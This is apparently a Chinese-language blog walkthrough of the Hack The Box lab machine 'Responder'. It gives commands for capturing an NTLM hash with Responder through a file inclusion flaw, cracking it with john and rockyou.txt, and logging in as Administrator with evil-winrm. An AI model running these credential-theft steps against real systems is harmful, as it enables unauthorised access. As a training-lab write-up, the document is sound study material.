---
title: HTB-Responder
description: 'Hack the box'
pubDate: 2024-02-28 
image: /hackthebox/Responder.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Windows Machine
---

测出网页存在文件包含漏洞

我们可以使用responder -I tun0，监听tun0网卡, 为获得登录信息

根据题目给出的远程文件//10.10.14.6/somefile，把地址改为自己机器的地址，进行访问

![](/image/hackthebox/Responder-1.png)

得到一串hash值

将这串内容复制，保存到一个新文件中

使用john对其进行破解

**john --wordlist=/usr/share/wordlists/rockyou.txt responder**

**--wordlist **用来指定字典

得到密码:badminton

ps:（**responder -I tun0** 是一个网络攻击工具，用于在指定的网络接口（这里是 tun0）上监听网络流量，并尝试获取凭据信息，比如用户名和密码等。）



WinRM(Windows Remote Management)windows远程管理，这个是基于powershell的功能

检测 WinRM 是否可用的最简单方法是查看端口是否打开, 如果这两个端口有一个打开：

5985/tcp (HTTP)

5986/tcp (HTTPS)

说明WinRM已配置，可以尝试进入远程会话

使用**evil-winrm**对目标进行连接

输入:** evil-winrm -i 10.129.218.203 -u Administrator -p badminton**

连接成功

使用**dir**可以查看当前目录下存在哪些文件

使用**cd .. **返回上一级目录





